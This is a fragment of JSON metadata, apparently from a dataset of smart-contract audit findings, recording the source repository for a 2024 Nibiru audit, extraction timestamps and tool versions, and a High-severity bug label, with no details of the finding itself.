{"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
